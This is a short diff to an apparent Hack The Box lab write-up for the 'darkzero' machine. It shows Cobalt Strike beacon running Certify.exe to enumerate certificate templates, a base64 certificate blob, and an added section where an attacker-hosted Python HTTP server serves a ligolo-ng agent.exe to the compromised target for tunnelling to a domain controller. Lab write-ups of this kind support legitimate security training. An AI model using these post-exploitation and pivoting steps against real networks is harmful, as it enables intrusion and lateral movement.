@@ -437,6 +437,8 @@ https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.7_Any/Cer
 
 Ill download the exe and run it through beacon
 
+# Elevating access to use `SeImpersonatePrivilege`
+
 ```python
 [20/08 20:13:51] ethan [471b11ef] beacon > execute-assembly /home/kali/htb/darkzero/Certify.exe enum-templates
 [20/08 20:13:51] [*] Task: execute .NET assembly
@@ -543,3 +545,14 @@ echo -n 'MIACAQMwgAYJKoZIhvcNAQcBoIAkgASCA+gwgDCABgkqhkiG9w0BBwGggCSABIID6DCCBVw
 ```
 
 Now ill put that into a pfx file, but in order to use it to authenticate i need to have access to `dc02` from my machine which means ill need to setup ligolo-ng for tunneling
+
+# Setting up ligolo-ng tunnel
+
+```python
+python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.129.48.21 - - [20/Aug/2026 20:27:30] "GET /agent.exe HTTP/1.1" 200 -
+```
+
+FIrst ill transfer the agent to the target
+
